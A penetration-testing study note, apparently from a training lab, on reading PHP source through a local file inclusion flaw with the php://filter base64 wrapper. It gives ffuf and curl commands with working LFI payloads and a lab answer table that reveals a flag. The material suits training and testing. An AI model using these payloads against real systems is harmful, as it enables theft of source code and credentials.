## ID
<!-- TODO: assign correct ID from your File Inclusion module range -->

## Module
File Inclusion

## Kind
notes

## Title
Section 4 — PHP Filters (Source Code Disclosure via php://filter)

## Description
Using the php://filter wrapper with convert.base64-encode to read PHP source files through an LFI vulnerability, bypassing execution and revealing credentials or configuration.

## Tags
lfi, php-wrappers, php-filter, base64, source-disclosure

## Commands
- ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://<TARGET>/FUZZ.php' -mc 200,301,302,403
- curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=<FILENAME>'
- echo '<BASE64_STRING>' | base64 -d
- curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=configure' | grep -oP '[A-Za-z0-9+/=]{40,}'

## What This Section Covers
When PHP includes a file, it executes it — so a normal LFI on a `.php` file renders blank output or HTML, not source code. The `php://filter` wrapper intercepts the stream before execution and applies a transformation (base64 encode), returning the raw source as an encoded string instead. This lets you read PHP source through LFI even when `.php` is the only allowed extension.

## Methodology
1. **Fuzz for PHP pages** — scan for all response codes (200, 301, 302, 403), not just 200. Hidden config/admin pages often return 302/403 but are still readable via LFI.
2. **Request the base64-encoded source** — use the filter wrapper:
   `?language=php://filter/read=convert.base64-encode/resource=<filename>`
   Omit the `.php` extension if the app appends it automatically.
3. **Grab the full base64 string** — view page source to avoid truncation; don't copy from rendered output.
4. **Decode and inspect** — pipe through `base64 -d`, look for credentials, DB keys, other `include`/`require` references to chase next.
5. **Repeat** — follow `include`/`require` paths found in decoded source to map the full app.

## Multi-step Workflow

```bash
# Step 1 — fuzz for PHP files (include 301/302/403)
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u 'http://<TARGET>/FUZZ.php' -mc 200,301,302,403

# Step 2 — read configure.php source via base64 filter
curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=configure'

# Step 3 — decode (paste the full base64 blob)
echo -n '<BASE64_STRING>' | base64 -d

# One-liner: extract + decode in a single command
curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=configure' \
  | grep -oP '[A-Za-z0-9+/=]{40,}' | base64 -d

# Read index.php source (no extension needed if app appends .php)
curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=index' \
  | grep -oP '[A-Za-z0-9+/=]{40,}' | base64 -d
```

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| DB password from a config file | `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}` | ffuf found `configure.php` → `php://filter/read=convert.base64-encode/resource=configure` → `base64 -d` → `DB_PASSWORD` |

## Key Takeaways
- `php://filter` works even when `.php` is the only allowed extension — it reads the file as a stream before PHP executes it.
- Always fuzz for 301/302/403 pages, not just 200 — config/admin files are often protected by redirect but still readable via LFI.
- Copy the base64 from **page source**, not rendered output — browsers may cut long strings.
- Decoded source often contains more `include`/`require` calls — recursively read those files to map the full app.
- The `resource=` value at the end means an appended `.php` just extends the filename naturally — no need to strip it manually.

## Gotchas
- If the app does **not** auto-append `.php`, include the extension explicitly: `resource=config.php`.
- Long base64 blobs may need the full page source — the grep one-liner may miss chunks if the output is split across lines; use `| tr -d '\n'` before decoding if you get padding errors.
- `php://filter` only works if the vulnerable function can execute PHP files (e.g. `include`, `require`). If the function only reads (e.g. `file_get_contents`), you get source directly without needing the filter.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-inclusion]]  
← [[03-basic-bypasses]] | [[05-php-wrappers]] →
<!-- AUTO-LINKS-END -->
